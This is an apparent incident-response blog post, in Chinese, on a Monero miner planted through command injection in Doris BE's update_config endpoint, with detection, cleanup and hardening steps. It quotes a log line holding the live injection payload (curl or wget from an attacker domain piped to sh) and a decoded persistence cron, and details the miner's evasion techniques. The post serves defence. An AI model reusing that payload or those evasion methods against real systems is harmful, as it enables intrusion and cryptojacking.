---
title: 一次门罗币挖矿病毒应急排查：从 Doris BE update_config 进来的矿工
date: 2026-10-22 23:53:13
tags: security, linux, doris, incident-response
categories: Posts
excerpt: Doris BE 的 /api/update_config 接口被利用进行命令注入，植入 XMRig 门罗币挖矿木马，导致两个 BE 节点 CPU 打满挂死。本文还原完整攻击链与样本行为，并给出可复用的应急排查流程。
---

# 一次门罗币挖矿病毒应急排查：从 Doris BE update_config 进来的矿工

## 事件概述

10 月 22 日中午发现异常：在此之前 Doris BE 节点 CPU 异常飙高，最终**两台 BE 节点挂死、数据库连不上**；尝试重启 BE 服务也起不来，排查发现有程序占用了 BE 服务端口。溯源确认这是一起门罗币（Monero / XMRig 系）挖矿病毒入侵，入侵发生在**前一天（10 月 21 日）下午**，入口是暴露在公网的 Doris BE HTTP 管理接口。

日志还原出的完整时间线：

| 时间（2026） | 事件 |
|---|---|
| 10-21 13:28 | 首次调用 `/api/update_config` 注入攻击载荷（本次日志最早的攻击记录，各节点时间略有差异） |
| 10-21 13:55 | 恶意程序落地 `/var/lib/.systemd-private-3d94f1a0/`，13:55:54 状态转为 `mining` |
| 10-21 17:25 | 第二次注入（载荷标记 `cve50-1021`），17:38 建立第二个副本目录 |
| 10-21 17:53 | 该副本**矿工二进制下载 15 分钟未成功**，只留下 190KB 残片，状态 `failed` |
| 10-21 19:10 | 第三个副本目录就绪并开始挖矿 |
| 10-21 19:33 | 第三次注入（`doris-1022`） |
| 10-22 09:51 | 第四次注入（`doris-1023`）——被处置前攻击者仍在持续尝试 |
| 10-22 中午 | 发现两台 BE 挂死、端口被占，开始应急处置 |

有意思的是，攻击载荷里带着 `TD_PROJ=doris-1021` 这样的项目标记——攻击者在用"项目名+日期"管理自己的攻击活动，这已经不是脚本小子的随机撒网，而是有一定工程化的持续作战。

## 攻击链分析

### 入口：update_config + jeprofile_dir 命令注入

Doris BE 默认监听 `8040` 端口提供 HTTP 管理接口，其中 `/api/update_config` 在旧版本中**无需任何认证**。但本次攻击并不是"改个配置就拿下服务器"，而是一条更隐蔽的命令注入链：

1. **设置恶意配置**：调用 `/api/update_config?jeprofile_dir=<载荷>&persist=false`，把内存分析工具（jeprofile）的输出目录 `jeprofile_dir` 设置成一段带 shell 元字符的字符串。
2. **触发执行**：当 BE 进行 heap profile dump 时，这个"目录"被拼进 dump 路径并交给 shell 处理——路径里的分号、括号被解释执行，注入的命令就这么跑起来了。BE 日志里留下了完整证据：

```log
I20261021 13:28:52 config_action.cpp:114] set_config jeprofile_dir=/tmp/.drsx83452; id; uname -m; (curl -fsSL -m90 'https://cdn.876553.xyz/Q1fc8a9OCb7AsC6f/dl/c9789d27-...' || wget -qO- 'https://cdn.876553.xyz/...') | TD_PROJ=doris-1021 sh >/dev/null 2>&1 & :; rm -rf /tmp/.drsx83452* 2>/dev/null; success. persist: 0
I20261021 13:29:19 heap_profiler.cpp:57] dump heap profile to /tmp/.drsx83452; id; uname -m; (curl ...) ... /jeheap_dump.1792560559.heap
```

3. **载荷行为**：`id; uname -m` 摸底系统环境 → `curl | sh` 异步拉取下一阶段脚本（`>/dev/null 2>&1` 全程静默）→ `rm -rf /tmp/.drsx*` 清理落地痕迹。整个载荷从配置注入到自清理一气呵成。

### 落地：伪装成 systemd 私有目录

攻击脚本在 `/var/lib/` 下创建形如 `.systemd-private-3d94f1a0/` 的目录——模仿 systemd 私有临时目录的命名（正常系统里 `/tmp/systemd-private-*` 很常见，藏进 `/var/lib` 再加个点前缀，`ls` 默认都看不见），这是 Linux 挖矿木马的典型藏匿手法。本次共发现三个副本目录：

| 文件 | 实际角色 |
|---|---|
| `systemd-resolved-helper` | 改名伪装的 **XMRig 矿工**（x86-64 静态编译 ELF，8.35MB，stripped；字符串中可见 RandomX、monero、donate-level 等 XMRig 特征）。`7b072e55` 目录里那份 190KB 的是下载中断的残片 |
| `.nm-inst.sh` / `.nm-dog.sh` | 安装器 / 看门狗脚本（内容几乎相同，仅路径不同；安装完成会把 inst 改名为 dog） |
| `.nm.conf` | XMRig 配置：三个矿池 + 两个钱包地址，75% 线程挖矿，donate-level 1% |
| `.nm-state` | 运行状态机，记录 `installing` / `mining` / `failed` 及时间戳 |

### 样本行为：一个"敬业"的看门狗脚本

读完 `.nm-inst.sh`（约 6KB），不得不承认这个脚本写得相当工程化：

1. **自我脱离**：`setsid` 脱离终端后台运行，不依赖任何父进程
2. **排除同行**：扫描 `/proc/*/cmdline`，先 `kill -9` 掉其他挖矿程序（`kworker/u8`、同类 `systemd-resolved-helper`），独占 CPU
3. **可靠的下载循环**：校验二进制大小必须是 8350992/8351120 字节，`curl` 失败换 `wget`、断点续传，最多重试 15 分钟，超时写 `failed` 状态退出（本次就有一份副本真的失败了）
4. **哈希扰动**：下载完成后往文件尾部追加 128 字节随机数据——**每个落地副本的 sha256 都不同**，专门逃避基于哈希/特征码的查杀
5. **时间戳伪造**：`touch -r /usr/sbin/sshd` 把文件 mtime 伪装成 sshd 的时间（本例中被伪装成 2020-02-05）
6. **cron 持久化**：root 权限写 `/etc/cron.d/0hourly-sysstat`（伪装成 sysstat 监控工具的定时任务），非 root 则写入用户 crontab。解码其 base64 内容后一目了然：

```cron
*/7 * * * * root grep -l -e 'kworker/u[8]' -e 'systemd-resolved-helper' /proc/[0-9]*/cmdline ... || sh /var/lib/.systemd-private-xxx/.nm-dog.sh ...
@reboot root sleep 30; sh /var/lib/.systemd-private-xxx/.nm-dog.sh ...
```

每 7 分钟检查一次矿工进程，死了就拉起；开机 30 秒后自启。

7. **五级启动 fallback + 进程伪装**：依次尝试 `python3 prctl(PR_SET_NAME)` 改名 → `bash exec -a` 改名 → `memfd_create` **无文件内存执行** → `ld.so --argv0` 改名 → 裸跑，全部把进程名伪装成内核线程 **`[kworker/u8:2]`**。在 `ps` 里它看起来就像一个人畜无害的内核工作线程
8. **自杀保护**：把矿工进程的 `oom_score_adj` 设为 1000——服务器内存紧张时 OOM killer 会**优先杀掉矿工自己**而不是业务进程。表面上是"贴心"地不影响业务，本质是避免因业务异常暴露自己的存在

## 通用应急排查流程

本次事件的处理思路整理成通用流程，分六步：**止血 → 定位进程 → 排查持久化 → 溯源 → 清除 → 加固**。核心原则：先保业务、别打草惊蛇、清除顺序不能错。

### 1. 止血（先保业务）

```bash
# 封锁入口：只允许内网访问 Doris 各管理端口
# 8030 FE http / 8040 BE http / 9030 FE MySQL协议
iptables -A INPUT -p tcp --dport 8040 ! -s 10.0.0.0/8 -j DROP
```

或直接在云安全组配置白名单。本次处置中，攻击者在 22 日上午仍在持续注入——**入口不封，清完还会再来**。

> ⚠️ 不要急着杀挖矿进程。看门狗（本例为 7 分钟一次的 cron）会立刻拉起，而且部分样本被干扰后会切换文件名和路径，增加排查难度。先摸清持久化，再统一清除。

### 2. 定位挖矿进程

```bash
ps aux --sort=-%cpu | head -15      # CPU 排名，矿工常年霸榜
ls -l /proc/<PID>/exe               # 看进程真实路径——伪装名的照妖镜
cat /proc/<PID>/cmdline
lsof -p <PID>                       # 打开的文件
ss -tnp | grep <PID>                # 对外连接
```

**典型特征：**

- CPU 长期 90%~100%，多核打满
- 进程路径在 `/tmp`、`/dev/shm`、`/var/tmp`、`/var/lib/.xxx` 等隐蔽目录
- 进程名伪装：本次是 `[kworker/u8:2]`（假装内核线程）和 `systemd-resolved-helper`（假装系统服务）；其他家族常见 `kdevtmpfsi`、`kinsing`、`xmrig`、随机字符串
- 对外连接矿池端口：3333、4444、5555、7777、14444 等

**鉴别伪装进程的关键**：`ps` 里看到 `[kworker/u8:2]` 不要慌（内核线程正常存在），但真正的内核线程其 `/proc/<PID>/exe` 为空或指向内核；如果**括号进程名的 exe 指向 `/var/lib` 下的用户态文件**，立刻锁定。本例中 `top` 里它是"内核线程"，`ls -l /proc/<PID>/exe` 直接现形。

另检查动态链接器劫持（本例未使用，但属常见手法）：

```bash
cat /etc/ld.so.preload    # 正常不存在或为空；非空 = libprocesshider 类隐藏
```

### 3. 排查持久化（复活机制）

清除成败的关键——把守护机制全找出来，否则杀进程等于白杀。

```bash
# 计划任务（重点！注意名字伪装成正常工具的 cron 文件）
crontab -l
ls -la /etc/cron.d/ /etc/cron.daily/ /var/spool/cron/
# 本次的伪装文件：/etc/cron.d/0hourly-sysstat（冒充 sysstat）
# cron 内容若为 base64，先解码再看：echo '<串>' | base64 -d

# systemd 定时器和服务
systemctl list-timers --all
systemctl list-units --type=service --state=running
ls -lt /etc/systemd/system/ /usr/lib/systemd/system/ | head

# SSH 后门公钥
cat /root/.ssh/authorized_keys
ls -la /home/*/.ssh/

# 新增账号 / 异常用户
cat /etc/passwd | grep -E 'sh$'
awk -F: '$3==0' /etc/passwd      # uid=0 的非 root 账号

# 内核级 rootkit（可选深度检查）
rkhunter --check
```

> 💡 恶意文件常被 `chattr +i` 锁定导致删不掉，先 `chattr -ia <file>` 解锁；`lsattr /etc/passwd /etc/shadow /etc/cron.d/*` 一并检查。

### 4. 溯源（怎么进来的）

```bash
last; lastb                          # 登录记录
history; cat /root/.bash_history     # 历史命令
find /tmp /var/tmp /dev/shm -mtime -3 -type f -exec ls -la {} \;
```

**针对中间件/数据库类入侵，组件日志往往是最直接的证据**。本次就是从 Doris 的 `be.INFO` 日志里检索到全部 4 次攻击注入记录：

```bash
grep -rE "update_config|jeprofile_dir" <be_log_dir>/
```

日志里能拿到：攻击时间、注入参数、`TD_PROJ` 活动标记、后续 dump 触发记录——足以还原完整时间线。

### 5. 清除（顺序很重要）

1. **先拆守护，再杀矿工**：停用/删除 cron 与 systemd 守护（本例：`rm /etc/cron.d/0hourly-sysstat`），再杀进程，用 `pstree -p` 看清父子链
2. 删除恶意文件（先 `chattr -ia` 解锁）：`/var/lib/.systemd-private-*/` 整目录、`/tmp/.drsx*` 残留
3. 清理其余持久化点位：`authorized_keys` 后门公钥、`ld.so.preload`、恶意服务
4. **改遍所有凭据**：SSH、数据库、API token、云密钥——攻击者能执行任意命令，应假定凭据已泄露
5. **重启验证**：清理后重启，观察 CPU、对外连接、cron 是否复发。复发说明还有漏网守护

### 6. 加固（针对本次入口）

**Doris 层面：**

- 升级到已修复版本：新版对配置接口增加了认证/校验
- FE/BE 所有管理端口（8030/8040/9030 及 web UI）**一律不暴露公网**，安全组白名单只放运维网段
- `jeprofile` 等调试类配置非必要不开启

**主机层面：**

- SSH 禁用密码登录改用密钥，禁 root 直接登录
- fail2ban / 安全组限制 SSH 来源
- 安装主机安全 agent（HIDS），对 `cron.d` 变更、异常进程名等配置告警

## IOC 指标（Indicators of Compromise）

| 类型 | 值 |
|---|---|
| 入口 URL | `/api/update_config?jeprofile_dir=...`（含命令注入载荷） |
| 下载域名 | `cdn.876553.xyz` |
| 落地目录 | `/var/lib/.systemd-private-*/`（`.nm-inst.sh` `.nm-dog.sh` `.nm.conf` `.nm-state`） |
| 矿工文件 | `systemd-resolved-helper`（8351120 字节 = 8350992 + 128 随机尾字节） |
| 伪装进程名 | `[kworker/u8:2]`、`systemd-resolved-helper` |
| 持久化文件 | `/etc/cron.d/0hourly-sysstat`（*/7 分钟拉活 + @reboot 自启） |
| 中间产物 | `/tmp/.drsx*`、`/tmp/.nm.cron` |
| 矿池 | `139.99.69.109:443`、`gulf.moneroocean.stream:443`、`106.55.151.217:3333` |
| 钱包 | `49hM2EPoSp94KEYpN6SdR5gWASZZXbQ8sT1Pthdk1AnXLMFkzZHUUSeYwQCL5vZcJxMdV72DcwaDD2e71qnitukfSqy8pcP` |
| 载荷标记 | `TD_PROJ=doris-1021` / `cve50-1021` / `doris-1022` / `doris-1023` |
| 样本 sha256 | `bda36d92056a55a62fd46b2e63bc8266fa9105bed43067a15638d6742c23bdde`<br>`fcff861a6d77ec532a63645512818b87e73498883e04723aa510ceddcaf6bd38`<br>`fa80a387cb00bee0937c9f26b8c0c3060d55b8f5b0103a7903d180098d47df5c`（残片） |

## 小结

1. **大数据组件的管理端口暴露公网 = 交出服务器**，没有例外。本次攻击者 21 小时内注入 4 次，入口不封，清理永无止境
2. 配置接口也可能成为命令注入点——`update_config` 本身只是改参数，但参数值最终进了 shell 就变成了 RCE。审计中间件时不要只看"有没有认证"，还要看"配置值流向哪里"
3. 清除挖矿病毒的核心不是杀进程，而是**先拆干净守护机制**（本例：7 分钟粒度的 cron 看门狗）
4. 这个家族的反排查手法值得记住：进程名伪装成内核线程、cron 文件伪装成 sysstat、时间戳伪造、每副本哈希扰动、OOM 自杀保护。识别它靠的不是杀软，而是 `ls -l /proc/<PID>/exe` 这类朴素手段
5. 应急结束的标准：重启后无复发 + 所有凭据已轮换 + 入口永久关闭
